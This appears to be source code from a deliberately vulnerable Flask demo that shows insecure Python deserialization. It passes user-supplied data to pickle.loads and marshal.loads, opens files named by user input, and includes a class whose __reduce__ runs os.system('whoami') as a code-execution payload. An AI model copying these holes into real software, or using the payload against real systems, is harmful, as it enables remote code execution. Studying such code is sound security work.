import pickle,os
from flask import request
from demo.common import SerializerJsonResponse
import base64
import os
import marshal




def savePickleInFile():
    file_name = "my_pickle_dump.txt"
    p_dict = {'name': '张三', 'age': 30, 'isMarried': False}  # 定义一个字典
    base_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(base_dir, file_name)
    print(file_path)
    with open(file_path, 'wb') as file:
        pickle.dump(p_dict, file)
    return SerializerJsonResponse(file_name)


def exutePickleFromFile():
    ser = request.form
    if ser:
        file_name = ser['fileName']
    else:
        return SerializerJsonResponse(None, 202, "params error")
    base_dir = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(base_dir, file_name)

    with open(file_path, 'rb') as file:
        p = pickle.load(file)
    return SerializerJsonResponse(p)

class A(object):
    def __init__(self):
        self.code = "ls"

    def __reduce__(self):
        return (os.system,('whoami',))

def makePickleData():
    ser = request.form
    if ser:
        code = ser['code']
    else:
        return SerializerJsonResponse(None, 202, "params error")
    a = A()
    p = pickle.dumps(a)
    a = base64.b64encode(p)
    return SerializerJsonResponse(a.decode('utf-8'))


# pickle 读取序列化数据
def getPickleData():
    ser = request.form
    if ser:
        code = ser['code']
    else:
        return SerializerJsonResponse(None, 202, "params error")
    origin_data = base64.b64decode(code)
    d = pickle.loads(origin_data)
    return SerializerJsonResponse(d)


# marshal
def vulCode(code="whoami"):
    import os
    os.system(code)


def makeMarshalData():
    ser = request.form
    if ser:
        code = ser['code']
    else:
        code = "None"
    code_serialized = marshal.dumps(vulCode)
    # print(code_serialized)
    # print(type(code_serialized))
    base_serialized = base64.b64encode(code_serialized)

    return SerializerJsonResponse(base_serialized.decode('utf-8'))


def getMarshalData():
    ser = request.form
    if ser:
        code = ser['code']
    else:
        return SerializerJsonResponse(None, 202, "params error")

    origin_data = base64.b64decode(code)
    d = marshal.loads(origin_data)
    print(d)
    return SerializerJsonResponse(d)